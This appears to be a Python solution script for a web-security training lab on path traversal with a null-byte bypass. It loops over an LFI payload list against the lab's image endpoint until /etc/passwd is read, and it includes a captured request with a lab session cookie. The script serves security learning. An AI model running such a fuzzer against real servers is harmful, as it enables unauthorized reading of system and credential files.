# Lab: File path traversal, validation of file extension with null byte bypass
import requests
from pathlib import Path

cwd = Path(__file__).resolve().parent
seclit_file_path = cwd / "lfi_jhaddix.txt"

with open(seclit_file_path, 'r', encoding="utf-8") as seclists:
    payloads = seclists.read().strip().splitlines()

base = "https://0a8700c704a251c2818a98d5001f0099.web-security-academy.net"
s = requests.Session()

print("===========[step1] get image with specific params===============")
# Image numbers may vary per lab → Replace with the actual filename in Burp before using
page_image = s.get(f"{base}/image", params={"filename": "29.jpg"})
print("status:", page_image.status_code)
print("type:", page_image.headers["Content-Type"], "/ size:", len(page_image.content))
'''
GET /image?filename=29.jpg HTTP/2
Host: 0a8700c704a251c2818a98d5001f0099.web-security-academy.net
Cookie: session=Ea3H7FfzG9Zbmihp9jWqzvAOqeBtGHS8
Sec-Ch-Ua: "Chromium";v="157", "Not-A.Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a8700c704a251c2818a98d5001f0099.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

'''

print("===========[step2] Do pathtraversal with absolute path to get passwd===============")
# try payloads
START = 1   # if u break input last printed num then execute

for i, payload in enumerate(payloads, start=1):   # i = linue number (from 1)
    if i < START:
        continue                                   # if already tried payload skip it
    r = s.get(f"{base}/image?filename={payload}")
    print(f"[{i}/{len(payloads)}] {r.status_code} {payload}")
    if "root:x:0:0" in r.text:
        print(f"[+] line {i} success: {payload}")
        break
